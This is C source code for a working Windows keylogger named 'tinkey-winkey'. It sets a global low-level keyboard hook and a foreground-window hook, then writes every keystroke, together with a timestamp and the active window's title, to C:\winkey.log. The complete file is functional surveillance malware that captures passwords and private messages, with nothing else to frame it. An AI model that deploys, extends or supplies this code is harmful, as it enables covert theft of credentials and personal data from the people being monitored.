#define _WIN32_WINNT 0x0A00
#define _WIN32_WINNT_WIN10_TH2 0x0A00
#define _WIN32_WINNT_WIN10_RS1 0x0A00
#define _WIN32_WINNT_WIN10_RS2 0x0A00
#define _WIN32_WINNT_WIN10_RS3 0x0A00
#define _WIN32_WINNT_WIN10_RS4 0x0A00
#define _WIN32_WINNT_WIN10_RS5 0x0A00
#define NTDDI_WIN10_CU 0x0A000004

#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <psapi.h>
#include <time.h>

HHOOK hKeyHook = NULL;
HWINEVENTHOOK hWinEventHook = NULL;
FILE* logFile = NULL;

// Function to get the name of the active window process
void GetActiveWindowProcessName(char* processName, DWORD processNameSize)
{
	HWND hwnd = GetForegroundWindow(); // Get handle to the foreground window
	if (hwnd == NULL)
	{
		strncpy_s(processName, processNameSize, "Unknown", _TRUNCATE);
		return;
	}

	GetWindowTextA(hwnd, processName, processNameSize);
}

// Function to convert virtual key code to character
wchar_t* VkCodeToString(DWORD vkCode)
{
	HKL keyboardLayout = GetKeyboardLayout(0); // Get the current keyboard layout
	wchar_t charBuffer[2] = { 0 };
	BYTE keyboardState[256];

	if (!GetKeyboardState(keyboardState))
	{
		return _wcsdup(L"?");
	}

	// Vérifiez les touches spéciales
	switch (vkCode)
	{
	case VK_RETURN:
		return _wcsdup(L"Enter");
	case VK_TAB:
		return _wcsdup(L"Tab");
	case VK_BACK:
		return _wcsdup(L"Backspace");
	case VK_ESCAPE:
		return _wcsdup(L"Escape");
	case VK_SPACE:
		return _wcsdup(L"Space");
	case VK_DELETE:
		return _wcsdup(L"Delete");
	case VK_LEFT:
		return _wcsdup(L"Left Arrow");
	case VK_RIGHT:
		return _wcsdup(L"Right Arrow");
	case VK_UP:
		return _wcsdup(L"Up Arrow");
	case VK_DOWN:
		return _wcsdup(L"Down Arrow");
	default:
		break;
	}

	int result = ToUnicodeEx(vkCode, MapVirtualKey(vkCode, MAPVK_VK_TO_VSC), keyboardState, charBuffer, 2, 0, keyboardLayout);
	if (result > 0)
	{
		wchar_t* resultStr = (wchar_t*)malloc(2 * sizeof(wchar_t));
		if (resultStr)
		{
			resultStr[0] = charBuffer[0];
			resultStr[1] = L'\0';
		}
		return resultStr;
	}
	return _wcsdup(L"?");
}

// Function to log keypress with timestamp and active window information
void LogKeystroke(DWORD vkCode)
{
	// Get the current time
	time_t now = time(NULL);
	struct tm* localTime = localtime(&now);

	// Convert virtual key code to character
	wchar_t* keyStr = VkCodeToString(vkCode);

	// Log the timestamp, process name, key character, and vkCode
	fprintf(logFile, "[%02d-%02d-%02d %02d:%02d:%02d] - Key: %ld (%ls)\n",
		localTime->tm_mday, localTime->tm_mon + 1, localTime->tm_year + 1900,
		localTime->tm_hour, localTime->tm_min, localTime->tm_sec,
		vkCode, keyStr);

	fflush(logFile); // Ensure the log is written immediately
	free(keyStr);
}

// Function to log the name of the active window
void LogActiveWindow(void)
{
	char processName[MAX_PATH] = { 0 };
	GetActiveWindowProcessName(processName, sizeof(processName));

	// Get the current time
	time_t now = time(NULL);
	struct tm* localTime = localtime(&now);

	// Log the timestamp and active window name
	fprintf(logFile, "[%02d-%02d-%02d %02d:%02d:%02d] - Active Window: %s\n",
		localTime->tm_mday, localTime->tm_mon + 1, localTime->tm_year + 1900,
		localTime->tm_hour, localTime->tm_min, localTime->tm_sec,
		processName);

	fflush(logFile); // Ensure the log is written immediately
}

// Callback function for window events
void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHookLocal, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
{
	(void)hWinEventHookLocal;
	(void)hwnd;
	(void)idObject;
	(void)idChild;
	(void)dwEventThread;
	(void)dwmsEventTime;
	if (event == EVENT_SYSTEM_FOREGROUND)
	{
		LogActiveWindow();
	}
}

// Hook procedure to handle keypresses
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION)
	{
		KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			DWORD vkCode = pKeyboard->vkCode;
			LogKeystroke(vkCode);
		}
	}
	return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

// Function to set up the keylogger
void StartKeylogger(void)
{
	errno_t err = fopen_s(&logFile, "C:\\winkey.log", "a+");
	if (err != 0 || !logFile)
	{
		return;
	}

	fprintf(logFile, " --- tinkey-winkey started ---\n");
	fflush(logFile);

	// Log the initial active window
	LogActiveWindow();

	// Set the low level keyboard hook
	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
	if (hKeyHook == NULL)
	{
		fprintf(logFile, "Failed to install keyboard hook! Error code: %ld\n", GetLastError());
		fflush(logFile);
		fclose(logFile);
		return;
	}

	// Set the window event hook for foreground window changes
	hWinEventHook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
	if (hWinEventHook == NULL)
	{
		fprintf(logFile, "Failed to install window event hook! Error code: %ld\n", GetLastError());
		fflush(logFile);
		UnhookWindowsHookEx(hKeyHook);
		fclose(logFile);
		return;
	}

	// Message loop to keep the hooks active
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hKeyHook);
	UnhookWinEvent(hWinEventHook);
	fclose(logFile);
}

int main(void)
{
	StartKeylogger();
	return 0;
}
